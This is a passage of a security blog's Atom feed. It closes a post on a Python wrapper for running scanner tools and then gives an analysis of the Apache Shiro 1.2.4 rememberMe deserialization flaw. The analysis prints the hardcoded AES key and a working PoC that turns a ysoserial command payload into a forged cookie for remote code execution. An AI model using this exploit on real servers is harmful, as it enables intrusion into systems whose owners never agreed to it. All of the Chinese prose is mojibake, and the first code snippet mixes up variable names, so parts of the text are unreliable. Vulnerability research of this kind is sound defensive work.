ä¸ºç¬¬ä¸‰æ–¹ç¨‹åºè¾“å‡ºæœ‰å¯èƒ½ä¼šç”¨<code>\r</code>åœ¨åŒä¸€è¡Œä¸Šå¤šæ¬¡æ‰“å°è¾“å‡ºï¼ˆå¦‚åœ¨å‘½ä»¤è¡Œæ˜¾ç¤ºè¿›åº¦æ¡çš„åŠæƒ…å†µï¼‰ï¼Œç”¨<code>readlines()</code>æ›´ä¼šé€ æˆç¨‹åºè¿è¡Œæ•ˆç‡æ…¢çš„é—®é¢˜ï¼ˆè°ä¹Ÿä¸æƒ³ä¸€ä¸ªæ—¥å¿—å¤„ç†ç¯èŠ‚æŠŠä¸€ä¸ªæ ¸å¿ƒçš„CPUæ‰“æ»¡å§ï¼Ÿï¼‰ï¼Œå› æ­¤è¯»å–æ—¥å¿—çš„å‡½æ•°åº”è¯¥è¿™æ ·å†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LASTLINE=<span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">( stdout)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> log_line <span class="keyword">in</span> _log_line_iter(stdout):</span><br><span class="line">        process_line(log_line)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_log_line_iter</span><span class="params">(reader)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> LASTLINE</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        buf = reader.read(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> buf:</span><br><span class="line">            <span class="keyword">if</span> platform.architecture()[<span class="number">-1</span>] == <span class="string">"ELF"</span>:</span><br><span class="line">                lines = buf.decode(<span class="string">'utf8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lines = buf.decode(<span class="string">'gbk'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">            lines = lines.replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>).replace(<span class="string">'\r'</span>, <span class="string">'\n'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            lines[<span class="number">0</span>] = lastline + lines[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> lines[:<span class="number">-1</span>]:</span><br><span class="line">                <span class="keyword">if</span> len(line) &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">yield</span> line</span><br><span class="line">            lastline = lines[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨ <code>read()</code>å‡½æ•°ä»ç¼“å†²åŒºæ‹¿æ•°æ®ï¼Œå¹¶ä¸”é€šè¿‡ <code>process_line(log_line)</code> è¿›è¡Œå¤„ç†ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå®šçš„å‡½æ•°äº†ï¼Œè¯¥æ‰“æ—¥å¿—æ‰“æ—¥å¿—ï¼Œè¯¥ä¿å­˜ä¿å­˜ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è¿›è¡Œè¶…æ—¶å¤„ç†çš„ï¼Œè¿™é‡Œsubprocessçš„<code>wait(timeout)</code>å·²ç»å…·æœ‰äº†è¶…æ—¶åŠŸèƒ½ï¼Œè¿™é‡Œæˆ‘ä»¬åªè¦æ³¨æ„è¶…æ—¶åå°†å­è¿›ç¨‹æ€æ­»å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(proc_pid)</span>:</span></span><br><span class="line">    process = psutil.Process(proc_pid)</span><br><span class="line">    <span class="keyword">for</span> proc <span class="keyword">in</span> process.children(recursive=<span class="literal">True</span>):</span><br><span class="line">        proc.kill()</span><br><span class="line">    process.kill()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    process.wait(timeout=timeout)</span><br><span class="line"><span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    kill(process.pid)</span><br><span class="line">    log_thread.join()</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æ€æ­»è¿›ç¨‹åï¼Œè¿˜æ˜¯éœ€è¦å°†ç¨‹åºæœ€åè¾“å‡ºè·å–å®Œï¼Œå†ç»“æŸæ—¥å¿—è¿›ç¨‹ã€‚</p><p>æœ€åå¯ä»¥é€šè¿‡æ—¥å¿—å’Œç¨‹åºè¿”å›å€¼<code>process.returncode</code>è·å–ç¨‹åºæ‰§è¡Œæƒ…å†µã€‚</p><h1 id="å°è£…ç±»"><a href="#å°è£…ç±»" class="headerlink" title="å°è£…ç±»"></a>å°è£…ç±»</h1><p>æ ¹æ®ä»¥ä¸Šå®ç°ï¼Œæœ¬äººå°è£…äº†ä¸€ä¸ªè¾ƒä¸ºæ–¹ä¾¿çš„è¶…ç±»ï¼Œç”¨çš„æ—¶å€™åªéœ€è¦ç»§æ‰¿è¿™ä¸ªç±»ï¼Œå†è‡ªå®šä¹‰æ‰“å°æ—¥å¿—å’Œå‘½ä»¤æ‰§è¡Œæˆ‘èƒ½çš„å›è°ƒå‡½æ•°å³å¯ï¼ˆåœ¨å›è°ƒå‡½æ•°ä¸­å¯ä»¥åšå¼‚å¸¸å¤„ç†ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> psutil</span><br><span class="line">OS_LINUX = <span class="string">"ELF"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(proc_pid)</span>:</span></span><br><span class="line">    process = psutil.Process(proc_pid)</span><br><span class="line">    <span class="keyword">for</span> proc <span class="keyword">in</span> process.children(recursive=<span class="literal">True</span>):</span><br><span class="line">        proc.kill()</span><br><span class="line">    process.kill()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandRunner</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, output_size: int = <span class="number">500</span>)</span>:</span></span><br><span class="line">        self.log_size = output_size</span><br><span class="line">        self.output = list()</span><br><span class="line">        self.lastline = <span class="string">''</span></span><br><span class="line">        self.cmd = <span class="literal">None</span></span><br><span class="line">        _, os = platform.architecture()</span><br><span class="line">        self.os = OS_LINUX <span class="keyword">if</span> <span class="keyword">not</span> os <span class="keyword">else</span> os</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(self, log_line)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span><span class="params">(self, cmd: str, timeout: int = <span class="number">-1</span>)</span> -&gt; int:</span></span><br><span class="line">        logging.info(<span class="string">"Running cmd: \"&#123;&#125;\""</span>.format(cmd))</span><br><span class="line">        <span class="keyword">if</span> self.os == OS_LINUX:</span><br><span class="line">            self.cmd = cmd</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.cmd = cmd + <span class="string">" &amp; exit"</span></span><br><span class="line">        self.process = subprocess.Popen(self.cmd, shell=<span class="literal">True</span>, bufsize=<span class="number">1024</span>, stdout=subprocess.PIPE,</span><br><span class="line">                                        stderr=subprocess.STDOUT)</span><br><span class="line">        log_thread = threading.Thread(target=self.print_log, args=(self.process.stdout,))</span><br><span class="line">        log_thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> timeout &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.process.wait(timeout=timeout)</span><br><span class="line">            <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">                kill(self.process.pid)</span><br><span class="line">                log_thread.join()</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.process.wait()</span><br><span class="line">        log_thread.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.callback()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(self, stdout)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> log_line <span class="keyword">in</span> self._log_line_iter(stdout):</span><br><span class="line">            self.log(log_line)</span><br><span class="line">            <span class="keyword">if</span> len(self.output) &gt; self.log_size:</span><br><span class="line">                <span class="keyword">del</span> self.output[<span class="number">0</span>]</span><br><span class="line">            self.output.append(log_line)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_log_line_iter</span><span class="params">(self, reader)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># fix massive log(memory error)</span></span><br><span class="line">            buf = reader.read(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> buf:</span><br><span class="line">                <span class="keyword">if</span> self.os == OS_LINUX:</span><br><span class="line">                    lines = buf.decode(<span class="string">'utf8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lines = buf.decode(<span class="string">'gbk'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">                lines = lines.replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>).replace(<span class="string">'\r'</span>, <span class="string">'\n'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">                lines[<span class="number">0</span>] = self.lastline + lines[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> lines[:<span class="number">-1</span>]:</span><br><span class="line">                    <span class="keyword">if</span> len(line) &gt; <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">yield</span> line</span><br><span class="line">                self.lastline = lines[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python å¼€å‘æ‰«æå™¨æ—¶å¾€å¾€ä¼šè°ƒç”¨å…¶ä»–ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œä½†æ˜¯é€šè¿‡ &lt;code&gt;os.system()&lt;/code&gt;æˆ–è€…å…¶ä»–å‘½ä»¤ä¸­æ˜¯ä¼šæœ‰è¿™æ ·æˆ–é‚£æ ·çš„å‘æˆ–ä¸è¶³ï¼Œæœ¬æ–‡å¯¹è¿™äº›é—®é¢˜è¿›è¡Œæ€»ç»“å¹¶æå‡ºè§£å†³æ–¹æ¡ˆï¼Œå¹¶åœ¨ç»“å°¾ç»™å‡ºäº†ä¸€ä¸ªå°è£…å¥½çš„ç±»ï¼Œèƒ½è¾ƒä¸ºå®Œç¾çš„è§£å†³Pythonè°ƒç”¨ç¬¬ä¸‰æ–¹å‘½ä»¤çš„é—®é¢˜ã€‚&lt;/p&gt;&lt;h1 id=&quot;éœ€æ±‚&quot;&gt;&lt;a href=&quot;#éœ€æ±‚&quot; class=&quot;headerlink&quot; title=&quot;éœ€æ±‚&quot;&gt;&lt;/a&gt;éœ€æ±‚&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;é¦–å…ˆï¼Œæˆ‘å¯ä»¥è°ƒç”¨ä»»æ„å‘½ä»¤ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å‘½ä»¤æ‰§è¡Œæ—¶å‘è¾“å…¥é€šé“ï¼ˆstdinï¼‰ä¼ æ›´å¤šè¾“å…¥ï¼ŒåŒæ—¶Pythonèƒ½å®æ—¶è·å–è¾“å‡ºé€šé“ï¼ˆstdoutï¼‰å’Œé”™è¯¯é€šé“ï¼ˆstderrï¼‰è·ç¨‹åºè¾“å‡ºï¼Œæ³¨æ„æ˜¯è·å–è¾“å‡ºï¼Œè€Œä¸æ˜¯å•çº¯çš„å°†è¾“å‡ºé‡å®šå‘åˆ°å±å¹•æˆ–æ–‡ä»¶ä¸­ï¼›&lt;/li&gt;
&lt;li&gt;æˆ‘å¯ä»¥é€šè¿‡è¿”å›å€¼ï¼Œæˆ–è€…ç¨‹åºè¾“å‡ºåˆ¤æ–­ç¬¬ä¸‰æ–¹ç¨‹åºæ‰§è¡Œæ˜¯å¦å‡ºé”™ï¼Œå¦‚æœå‡ºé”™æŠ›å‡ºå¼‚å¸¸æˆ–è€…è¿›è¡Œå¼‚å¸¸å¤„ç†ï¼›&lt;/li&gt;
&lt;li&gt;æ‰§è¡Œå‘½ä»¤æ˜¯æœ€å¥½å¯ä»¥è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œé˜²æ­¢å­å‘½ä»¤å‡æ­»è€Œå½±å“ä¸»ç¨‹åºï¼›&lt;/li&gt;
&lt;li&gt;è¿™æ®µè°ƒç”¨ç¨‹åºåº”è¯¥æ˜¯è·¨å¹³å°çš„ï¼Œæ¯•ç«ŸPythonæœ¬èº«å°±æ˜¯è·¨å¹³å°è¯­è¨€ã€‚&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="å®‰å…¨å¼€å‘" scheme="http://anemone.top/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="å®‰å…¨å¼€å‘" scheme="http://anemone.top/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="Python" scheme="http://anemone.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Shiro v1.2.4ååºåˆ—åŒ–</title>
    <link href="http://anemone.top/vulnresearch-Shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://anemone.top/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/</id>
    <published>2019-11-25T07:16:43.000Z</published>
    <updated>2020-03-21T08:21:20.482Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><h2 id="è§¦å‘å…¥å£"><a href="#è§¦å‘å…¥å£" class="headerlink" title="è§¦å‘å…¥å£"></a>è§¦å‘å…¥å£</h2><p>ç™»å½•ç‚¹å‡»è®°ä½å¯†ç æ—¶ï¼Œæœ‰rememberMeï¼Œä¸‹æ¬¡ç™»é™†æ—¶ä¼šå¸¦rememberMeçš„cookieï¼ŒrememberMeå­˜åœ¨ååºåˆ—åŒ–é—®é¢˜</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1563415886850.png" alt="1563415886850"></p><h2 id="åºåˆ—åŒ–å…¥å£"><a href="#åºåˆ—åŒ–å…¥å£" class="headerlink" title="åºåˆ—åŒ–å…¥å£"></a>åºåˆ—åŒ–å…¥å£</h2><p>è°ƒè¯•å¾—åˆ°åºåˆ—åŒ–å…¥å£å’Œè§£å¯†æ–¹æ³•ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(AuthenticationToken, AuthenticationInfo):321</span><br><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(Subject, PrincipalCollection)</span><br><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes(L360:åºåˆ—åŒ–)</span><br><span class="line">    org.apache.shiro.mgt.AbstractRememberMeManager#encrypt(åŠ å¯†æ–¹æ³•)</span><br></pre></td></tr></table></figure><a id="more"></a><p>åœ¨encryptå‡½æ•°ä¸­å¯ä»¥çœ‹åˆ°åŠ å¯†æ–¹æ³•ä¸ºAES-CBC</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1563420577517.png" alt="1563420577517"> </p><h2 id="è·å–åŠ å¯†key"><a href="#è·å–åŠ å¯†key" class="headerlink" title="è·å–åŠ å¯†key"></a>è·å–åŠ å¯†key</h2><p>AbstractRememberMeManager#encrypt() è°ƒç”¨äº†getEncryptionCipherKey()æ–¹æ³•è·å–åŠ å¯†ç”¨çš„key</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1565425414839.png" alt="1565425414839"></p><p>getEncryptionCipherKeyè¿”å›äº†encryptionCipherKeyï¼ŒencryptionCipherKeyåœ¨AbstractRememberMeManagerç±»åˆå§‹åŒ–æ—¶è®¾ç½®ï¼š</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1565425554398.png" alt="1565425554398"></p><p>å‘ä¸Šæ‰¾åˆ°AbstractRememberMeManager#DEFAULT_CIPHER_KEY_BYTESï¼Œå¯†é’¥ç¡¬ç¼–ç åˆ°äº†ä»£ç é‡Œï¼š</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1565425627351.png" alt="1565425627351"></p><h2 id="åˆ†ærememberMeæ ¼å¼"><a href="#åˆ†ærememberMeæ ¼å¼" class="headerlink" title="åˆ†ærememberMeæ ¼å¼"></a>åˆ†ærememberMeæ ¼å¼</h2><p>ivå’ŒrememberMeäº§ç”Ÿæ¥ç€è°ƒè¯•</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</span><br><span class="line">org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[])</span><br><span class="line">org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[], byte[], boolean)</span><br></pre></td></tr></table></figure><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1563420885798.png" alt="1563420885798"></p><p>å³rememberme=b64(IV+encrypt(serial))</p><p>å› æ­¤æœ‰è§£å¯†ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> enc_file, open(<span class="string">"./decrypt.bin"</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> dec_file:</span><br><span class="line">    cookie = base64.b64decode(enc_file.read())</span><br><span class="line">    key  = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv=cookie[:<span class="number">16</span>]</span><br><span class="line">    serial=cookie[<span class="number">16</span>:]</span><br><span class="line">    encryptor = AES.new(key, mode, IV=iv)</span><br><span class="line">    remember_bin = encryptor.decrypt(serial)</span><br><span class="line">    dec_file.write(remember_bin)</span><br></pre></td></tr></table></figure><h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><p>å› æ­¤æœ‰ååºåˆ—åŒ–ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'CommonsCollections4'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–å…¥å£</p><p>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p><pre><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals    org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes); <span class="comment">//sink</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;åŸç†&quot;&gt;&lt;a href=&quot;#åŸç†&quot; class=&quot;headerlink&quot; title=&quot;åŸç†&quot;&gt;&lt;/a&gt;åŸç†&lt;/h1&gt;&lt;h2 id=&quot;è§¦å‘å…¥å£&quot;&gt;&lt;a href=&quot;#è§¦å‘å…¥å£&quot; class=&quot;headerlink&quot; title=&quot;è§¦å‘å…¥å£&quot;&gt;&lt;/a&gt;è§¦å‘å…¥å£&lt;/h2&gt;&lt;p&gt;ç™»å½•ç‚¹å‡»è®°ä½å¯†ç æ—¶ï¼Œæœ‰rememberMeï¼Œä¸‹æ¬¡ç™»é™†æ—¶ä¼šå¸¦rememberMeçš„cookieï¼ŒrememberMeå­˜åœ¨ååºåˆ—åŒ–é—®é¢˜&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1563415886850.png&quot; alt=&quot;1563415886850&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;åºåˆ—åŒ–å…¥å£&quot;&gt;&lt;a href=&quot;#åºåˆ—åŒ–å…¥å£&quot; class=&quot;headerlink&quot; title=&quot;åºåˆ—åŒ–å…¥å£&quot;&gt;&lt;/a&gt;åºåˆ—åŒ–å…¥å£&lt;/h2&gt;&lt;p&gt;è°ƒè¯•å¾—åˆ°åºåˆ—åŒ–å…¥å£å’Œè§£å¯†æ–¹æ³•ï¼š&lt;/p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(AuthenticationToken, AuthenticationInfo):321&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(Subject, PrincipalCollection)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes(L360:åºåˆ—åŒ–)			&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		org.apache.shiro.mgt.AbstractRememberMeManager#encrypt(åŠ å¯†æ–¹æ³•)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="æ¼æ´åˆ†æ" scheme="http://anemone.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Webå®‰å…¨" scheme="http://anemone.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Shiro" scheme="http://anemone.top/tags/Shiro/"/>
    
      <category term="ååºåˆ—åŒ–" scheme="http://anemone.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Java" scheme="http://anemone.top/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="http://anemone.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
